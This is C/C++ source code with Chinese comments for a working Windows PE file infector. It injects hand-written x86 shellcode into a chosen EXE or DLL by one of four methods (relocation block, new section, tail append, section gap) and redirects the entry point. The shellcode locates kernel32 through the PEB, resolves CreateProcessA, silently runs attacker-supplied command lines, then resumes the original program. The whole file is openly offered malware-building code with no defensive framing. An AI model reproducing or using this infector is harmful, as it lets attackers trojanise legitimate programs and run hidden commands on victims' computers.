// PE文件感染.cpp: 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "stdlib.h"
#include "windows.h"
#include "string.h"


typedef struct options{

	const char *OptionName;
	int Num;
	struct options *Next;

}*OPTIONS;

void errorout(const char *errortext);
DWORD Rva_To_Offset(PIMAGE_NT_HEADERS32 pinh, DWORD RVA);
PIMAGE_SECTION_HEADER Rva_To_Section(PIMAGE_NT_HEADERS32 pinh, DWORD RVA);
void AddOptions(OPTIONS *opts,const char *OptName, int num);
BOOL CheckOption(OPTIONS opts, int num);
DWORD shellcode();
DWORD Align1000H(DWORD value);

int main(int argc,char *argv[],char *envp[])
{

	char *FileName;
	char *RunCmdLine[256] = {NULL};
	int NumOfStrings = 0;
	int LenToStrings=0;
	int i,j=0;
	if (argv[1] != NULL) {
		for (i = 0; argv[i] != NULL; i++) {
			if (!strcmp(argv[i], "-r")) {
				if (argv[++i] == NULL) {
					errorout("请输入-r \"感染文件要运行的命令行!!\"\n");
				}
				RunCmdLine[j] = argv[i];
				LenToStrings += strlen(RunCmdLine[j])+1;
				NumOfStrings++;
				j++;
				continue;

			}


		}

		if (RunCmdLine[0] == NULL) {
			errorout("请输入-r \"感染文件要运行的命令行!!\"\n");
		}
		if (argv[i - 1] == RunCmdLine[j-1]) {
			errorout("请输入目标感染文件!!\n");
		}
		FileName = argv[i - 1];
		
		

	}
	else {
	
		FileName = (char *)malloc(256);
		printf("请输入要感染的文件名:");
		fgets(FileName, 256, stdin);
		FileName[strlen(FileName)-1] = 0;
	GetCmdLine:
		RunCmdLine[j] = (char *)malloc(1024);
		printf("请输入要捆绑运行的命令行:");
		fgets(RunCmdLine[j], 1024, stdin);
		if (RunCmdLine[j][0] == '\n') { goto start; }
		RunCmdLine[j][strlen(RunCmdLine[j])-1] = 0;
		LenToStrings += strlen(RunCmdLine[j]) + 1;
		NumOfStrings++;
		j++;
		goto GetCmdLine;
	}

start:
	printf("选中文件:%s\n\n", FileName);
	
	HANDLE FileHandle = CreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, 0);
	DWORD FileSize = GetFileSize(FileHandle, NULL);
	PBYTE pFileBin = (PBYTE)malloc(FileSize);
	DWORD temp;
	if (!ReadFile(FileHandle, pFileBin, FileSize, &temp, NULL)) {errorout("文件不能读取!\n请检查文件是否存在或程序权限不足!\n");}

	OPTIONS InfectOpts = NULL;
	//得到PE文件基本信息

	PIMAGE_DOS_HEADER pidh=(PIMAGE_DOS_HEADER)pFileBin;
	PIMAGE_NT_HEADERS32 pinh = (PIMAGE_NT_HEADERS32)(pFileBin + pidh->e_lfanew);
	PIMAGE_IMPORT_DESCRIPTOR piid = (PIMAGE_IMPORT_DESCRIPTOR)(pFileBin+ Rva_To_Offset(pinh,pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress));
	PIMAGE_SECTION_HEADER pish = IMAGE_FIRST_SECTION(pinh);
	BOOL DLL = false;
	if (pinh->FileHeader.Characteristics & 0x2000) { printf("文件为DLL文件\n\n"); DLL = true; }
	else { printf("文件为EXE文件\n\n"); }
	DWORD RelocInfoOffset = Rva_To_Offset(pinh, pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	unsigned char codetz[] = { 85,139,236,129,236,0,2,0,0,96,51,246,131,198,4,139,197,43,198,199,0,0,0,0,0,129,254,0,2,0,0,117 };
	int sizeofshellcode = 0;
	PBYTE pShellCode = (PBYTE)(shellcode() - 5 + 7);
	DWORD CheckValue = *(PDWORD)pShellCode;

	while (CheckValue != 0x90909090) {

		sizeofshellcode++;
		CheckValue = *((PDWORD)((DWORD)pShellCode + sizeofshellcode));

	}

	int SizeOfNewShellCode = sizeofshellcode + LenToStrings + 4 + 15+LenToStrings+1;
	PBYTE pNewShellCode = (PBYTE)malloc(SizeOfNewShellCode);

	memcpy(pNewShellCode, pShellCode, sizeofshellcode + 4 + 15);
	memcpy(pNewShellCode + sizeofshellcode, &(pinh->OptionalHeader.AddressOfEntryPoint), 4);
	int lens=1;
	memset(pNewShellCode + sizeofshellcode + 4 + 15, NumOfStrings, 1);
	for (i = 0; i < NumOfStrings; i++) {
		memcpy(pNewShellCode + sizeofshellcode + 4 + 15+lens, RunCmdLine[i], strlen(RunCmdLine[i]));
		lens += strlen(RunCmdLine[i])+1;
		memset(pNewShellCode + sizeofshellcode + 4 + 15 + lens-1, 0, 1);
	}
	
	

	if (!memcmp(pFileBin + Rva_To_Offset(pinh, pinh->OptionalHeader.AddressOfEntryPoint), codetz, 32)) { errorout("该文件已被感染过了!!"); }


	if (RelocInfoOffset != 0 && (pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size >= SizeOfNewShellCode) && !DLL) {
		AddOptions(&InfectOpts, "使用重定位块(推荐,不会改变文件大小)", 0);
	}


	if ((pinh->OptionalHeader.SizeOfHeaders - pidh->e_lfanew - pinh->FileHeader.SizeOfOptionalHeader - sizeof(IMAGE_FILE_HEADER) - pinh->FileHeader.NumberOfSections * 40-4) >= 40) {
		AddOptions(&InfectOpts, "插入新节表", 1);
	}

	if (pinh->FileHeader.NumberOfSections >= 1) {
		AddOptions(&InfectOpts, "尾部插入代码", 2);
	}
	DWORD OffsetOfFreedomSpace;
	PIMAGE_SECTION_HEADER freedomsection;
	for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
	
		if (((int)pish[i].SizeOfRawData - (int)pish[i].Misc.VirtualSize) >= SizeOfNewShellCode) {
			AddOptions(&InfectOpts, "利用区段间隙(推荐,不会改变文件大小)", 3);
			OffsetOfFreedomSpace = pish[i].PointerToRawData + pish[i].Misc.VirtualSize;
			freedomsection = pish+i;
			break;
		}
	
	}

	printf("发现可用感染方式:\n\n\n");
	
	if (InfectOpts == NULL) { errorout("该文件不可感染!\n"); }

	OPTIONS temp_opts=InfectOpts;

	while (temp_opts != NULL) {
		
		printf("%d   %s\n\n", temp_opts->Num, temp_opts->OptionName);

		temp_opts = temp_opts->Next;
	
	}
	
	
	//68
	
	IMAGE_SECTION_HEADER use_ish;
	PBYTE pNewFileBin;
	DWORD NewFileSize;
	DWORD WritePointer;

	int Num;
get:	printf("请输入感染方式的代号:");
	scanf("%d", &Num);
	putchar('\n');

	switch (Num) {
	
	case 0:
		if (!CheckOption(InfectOpts, 0)) {
			goto de;
		}
		printf("选中方法:使用重定位块\n\n");
		//利用重定位块
		memset((PVOID)(pFileBin + RelocInfoOffset), 0, pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);//清空重定位块
		memcpy((PVOID)(pFileBin + RelocInfoOffset), (PVOID)pNewShellCode, SizeOfNewShellCode);
		pinh->OptionalHeader.AddressOfEntryPoint = pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		pish = Rva_To_Section(pinh, pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		pish->Characteristics = 0xE0000060;
		pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;
		pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
		pinh->FileHeader.Characteristics |= 1;//禁用随机基址
		pNewFileBin = pFileBin;
		NewFileSize = FileSize;
		break;
	case 1:
		if (!CheckOption(InfectOpts, 1)) {
			goto de;
		}
		printf("选中方法:插入新节表\n\n");
		//插入新节表
		use_ish.Characteristics = 0xE0000060;
		use_ish.Misc.VirtualSize = 4096;
		use_ish.SizeOfRawData = 4096;
		use_ish.Name[0] = 'p';
		use_ish.Name[1] = 'e';
		use_ish.Name[2] = 'd';
		use_ish.Name[3] = 'i';
		use_ish.Name[4] = 'y';
		memset(use_ish.Name + 5, 0, 3);
		use_ish.VirtualAddress =Align1000H( pish[pinh->FileHeader.NumberOfSections - 1].VirtualAddress + pish[pinh->FileHeader.NumberOfSections - 1].Misc.VirtualSize);
		use_ish.PointerToRawData= Align1000H(pish[pinh->FileHeader.NumberOfSections - 1].PointerToRawData + pish[pinh->FileHeader.NumberOfSections - 1].SizeOfRawData);
		use_ish.NumberOfLinenumbers = 0;
		use_ish.NumberOfRelocations = 0;
		use_ish.PointerToLinenumbers = 0;
		use_ish.PointerToRelocations = 0;
		memcpy(pFileBin + pidh->e_lfanew + sizeof(IMAGE_FILE_HEADER) + pinh->FileHeader.SizeOfOptionalHeader + pinh->FileHeader.NumberOfSections * 40 + 4, &use_ish, sizeof(IMAGE_SECTION_HEADER));
		pinh->FileHeader.NumberOfSections++;
		pinh->OptionalHeader.SizeOfImage += 0x1000;
		pinh->OptionalHeader.AddressOfEntryPoint = use_ish.VirtualAddress;

		NewFileSize = FileSize + use_ish.PointerToRawData + use_ish.SizeOfRawData;
		pNewFileBin = (PBYTE)calloc(1,NewFileSize);

		memcpy(pNewFileBin, pFileBin, FileSize);
		memcpy(pNewFileBin + use_ish.PointerToRawData, pNewShellCode, SizeOfNewShellCode);

		break;
	case 2:
		if (!CheckOption(InfectOpts, 2)) {
			goto de;
		}
		printf("选中方法:尾部插入代码\n\n");
		//尾插
		pish = pish + pinh->FileHeader.NumberOfSections - 1;//pish指向最后一个区段
		pinh->OptionalHeader.AddressOfEntryPoint = pish->VirtualAddress+pish->Misc.VirtualSize;
		WritePointer = pish->PointerToRawData + pish->Misc.VirtualSize;
		pish->SizeOfRawData = pish->Misc.VirtualSize+ 0x1000;
		pish->Misc.VirtualSize += 0x1000;
		pish->Characteristics= 0xE0000060;
		pinh->OptionalHeader.SizeOfImage += 0x1000;

		NewFileSize = pish->PointerToRawData + pish->Misc.VirtualSize;
		pNewFileBin = (PBYTE)calloc(1,NewFileSize);
		memcpy(pNewFileBin, pFileBin, FileSize);
		memcpy(pNewFileBin + WritePointer, pNewShellCode, SizeOfNewShellCode);


		break;
	case 3:
		if (!CheckOption(InfectOpts, 3)) {
			goto de;
		}
		printf("选中方法:利用区段间隙\n\n");
		//利用间隙
		freedomsection->Characteristics= 0xE0000060;
		pinh->OptionalHeader.AddressOfEntryPoint = freedomsection->VirtualAddress+ freedomsection->Misc.VirtualSize;
		freedomsection->Misc.VirtualSize = freedomsection->SizeOfRawData;
		memcpy(pFileBin + OffsetOfFreedomSpace, pNewShellCode, SizeOfNewShellCode);
		pNewFileBin = pFileBin;
		NewFileSize = FileSize;

		break;
	default:
	de:	printf("错误的序号!\n\n");
		goto get;
	}

	char pNewFileName[256] = {0};
	char temp_str[256] = { 0 };
	memcpy(temp_str, FileName, strlen(FileName) - 4);
	if (DLL) {
		sprintf(pNewFileName, "%s\.infected\.dll", temp_str);
	}
	else {
		sprintf(pNewFileName, "%s\.infected\.exe", temp_str);
	}

	

	HANDLE NewFileHandle = CreateFileA(pNewFileName, GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, 0);

	if (NewFileHandle == INVALID_HANDLE_VALUE) { errorout("创建文件失败!"); }

	WriteFile(NewFileHandle, pNewFileBin, NewFileSize,&temp,NULL);

	printf("感染成功!\n\n");

	printf("输出文件:%s\n\n", pNewFileName);

	CloseHandle(FileHandle);
	CloseHandle(NewFileHandle);
	//system("pause");

    return 0;
}

void errorout(const char *errortext) {

	fwrite(errortext, 1, strlen(errortext), stderr);
	//system("pause");
	exit(1);
}
DWORD Rva_To_Offset(PIMAGE_NT_HEADERS32 pinh, DWORD RVA) {

	PIMAGE_SECTION_HEADER pish;
	pish = IMAGE_FIRST_SECTION(pinh);

	for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
	
		if (RVA >= pish[i].VirtualAddress && RVA < (pish[i].VirtualAddress + pish[i].Misc.VirtualSize)) {
		
			return RVA - pish[i].VirtualAddress + pish[i].PointerToRawData;
		}
	
	}
	return 0;
}
PIMAGE_SECTION_HEADER Rva_To_Section(PIMAGE_NT_HEADERS32 pinh, DWORD RVA) {

	PIMAGE_SECTION_HEADER pish;
	pish = IMAGE_FIRST_SECTION(pinh);

	for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {

		if (RVA >= pish[i].VirtualAddress && RVA < (pish[i].VirtualAddress + pish[i].SizeOfRawData)) {

			return pish+i;
		}

	}
	return NULL;

}
void AddOptions(OPTIONS *opts, const char *OptName, int num) {

	OPTIONS temp = (OPTIONS)malloc(sizeof(struct options));
	temp->Next = *opts;
	temp->Num = num;
	temp->OptionName = OptName;
	*opts = temp;

}
BOOL CheckOption(OPTIONS opts, int num) {

	while (opts != NULL) {
		
		if (opts->Num == num) {
		
			return true;
		
		}
		opts = opts->Next;
	}
	return false;
}
DWORD _declspec(naked) shellcode() {//ShellCode部分直到90909090结束

	//调用此函数会返回该函数自身代码位置

	_asm
	{
		call s
		s:	
		pop eax
		ret

		//正式代码
	start:
		push ebp
		mov ebp, esp
		sub esp, 0x200
		pushad
		xor esi,esi
	clearheap:
		add esi, 4
		mov eax,ebp
		sub eax,esi
		mov dword ptr [eax],0
		cmp esi,0x200
		jne clearheap
		
		call s1
	s1:	pop eax
		sub eax,0x26
		add eax,offset text
		sub eax,offset start
		mov [ebp-0x10],eax//local4=RVAofEP
		add eax,4
		mov [ebp-4],eax//local1=Text BaseAddress
		mov eax,fs:[0x30]//PEB
		mov ebx,[eax+0x0c]//LDR
		mov esi,[ebx+0x1c]//flink第一项
		jmp get
	re:	
		mov esi,[esi]
	get:	
		mov ecx,[esi+0x20]//unicode string
		mov eax,[ecx]
		and eax,0xDFDFDFDF
		cmp eax,0x0045004b
		jne re
		mov eax, [ecx+4]
		and eax, 0xDFDFDFDF
		cmp eax,0x004e0052
		jne re
		mov eax, [ecx+8]
		and eax, 0xDFDFDFDF
		cmp eax,0x004c0045
		jne re
		mov eax, [ecx+0x0c]
		cmp eax,0x00320033
		jne re
		mov ebx,[esi+8]//ebx=kernel32.dll BaseAddress
		mov [ebp-8],ebx//local2=kernel32.dll BaseAddress

		push [ebp-4]
		push ebx
		call GetProc
		mov [ebp-0x0c],eax//local3=CreateProcessA
		
		add[ebp - 4], 0x0F
		xor ecx, ecx
		mov eax, [ebp - 4]
		mov cl, byte ptr[eax]
		

		
	R:	inc [ebp-4]
		
		push ecx
		lea eax, [ebp - 0xD4]
		mov dword ptr[eax], 1
		lea eax, [ebp - 0x150]
		push eax
		lea eax, [ebp - 0x100]
		mov dword ptr[eax], 0x44
		push eax
		push 0
		push 0
		push 0
		push 0
		push 0
		push 0
		push [ebp-4]
		push 0
		call [ebp-0x0c]
		pop ecx
		dec ecx
		je e
	getnextstr:
		inc dword ptr [ebp-4]
		mov eax,[ebp-4]
		cmp byte ptr [eax], 0
		jne getnextstr
		jmp R



	e:	mov esi, [ebp-0x10]
		and esi,0xFFFF0000
	_loop_FindBaseAddress:
		lodsw
		sub esi,0x10002
		cmp ax,'ZM'
		jne _loop_FindBaseAddress
		add esi,0x10000
		mov [ebp-4],esi
		mov esi,[ebp-0x10]
		lodsd
		add [ebp-4],eax
		popad
		mov eax, [ebp - 4]
		add esp, 0x200
		pop ebp
		jmp eax


	_strcmp_:
			push ebp
			mov ebp,esp
			sub esp,0x10
			pushad
			mov esi,[ebp+8]//esi=arg1
			xor ecx,ecx
			xor ebx,ebx
			jmp loop_getstrlen

		pd:	inc ebx
			mov esi,[ebp+0x0c]//esi=arg2
			mov[ebp - 4], ecx
			xor ecx,ecx
		
		loop_getstrlen:
			inc ecx
			mov al,byte ptr [esi]
			inc esi
			cmp al,00
			jne loop_getstrlen
			dec ecx//ecx=arg str's len
			cmp ebx,0
			je pd
			cmp ecx,[ebp-4]
			je _cmp_chars
			jmp _strcmp_ret
		
		_cmp_chars:	

			mov esi,[ebp+8]
			mov edi,[ebp+0x0c]
		_loop_checkchar:

			cmp ecx,0
			je ed
			mov al,byte ptr [esi]
			xor al,byte ptr [edi]
			inc esi
			inc edi
			dec ecx
			cmp al,0
			je _loop_checkchar 
			jmp _strcmp_ret
		ed:
			popad
			mov eax,1
			add esp, 0x10
			pop ebp
			ret 8
		_strcmp_ret:
			popad
			mov eax,0
			add esp, 0x10
			pop ebp
			
			ret 8
	GetProc://arg1=Handle,arg2=FunName
			push ebp
			mov ebp,esp
			sub esp,0x10
			pushad
				mov ebx,[ebp+8]
				xor eax, eax
				mov ax, word ptr[ebx + 0x3c]
				mov edx, ebx
				add edx, eax
				mov edx, [edx + 0x78]
				add edx, ebx//edx=export table va

				mov esi, [edx + 0x20]
				add esi, ebx//esi=Function name table VA
				xor ecx, ecx
			loop_FindGetProc :
				inc ecx
				mov edi, [esi]
				add edi, ebx//edi=function name va
				push edi
				push [ebp+0x0c]
				call _strcmp_
				add esi, 4
				cmp eax,1
				jne loop_FindGetProc
				dec ecx
				//ecx=函数位置值
				mov esi, [edx + 0x24]//esi =函数索引表RVA
				add esi, ebx
				xor eax, eax
				mov ax, word ptr[esi + ecx * 2]
				//eax=函数索引值
				mov esi, [edx + 0x1c]//esi=函数地址表RVA
				add esi, ebx
				mov eax, [esi + eax * 4]
				add eax, ebx
				mov[ebp - 4], eax//local1=address
				popad
				mov eax,[ebp-4]
				add esp, 0x10
				pop ebp
				ret 8

	text:
			nop
			nop
			nop
			nop//这里nop字节填写旧EP

			//offset 0x04
			_EMIT 'C'
			_EMIT 'r'
			_EMIT 'e'
			_EMIT 'a'
			_EMIT 't'
			_EMIT 'e'
			_EMIT 'P'
			_EMIT 'r'
			_EMIT 'o'
			_EMIT 'c'
			_EMIT 'e'
			_EMIT 's'
			_EMIT 's'
			_EMIT 'A'
			_EMIT 0x00
			//offset 0x13


			nop//第一个字节命令行数目
			nop
			nop
			nop
			//这里nop字节填写命令行
	}



}
DWORD Align1000H(DWORD value) {

	int temp=value;
	value %= 4096;
	if (value == 0) {
		return temp;
	}
	temp += 4096 - value;
	return temp;
}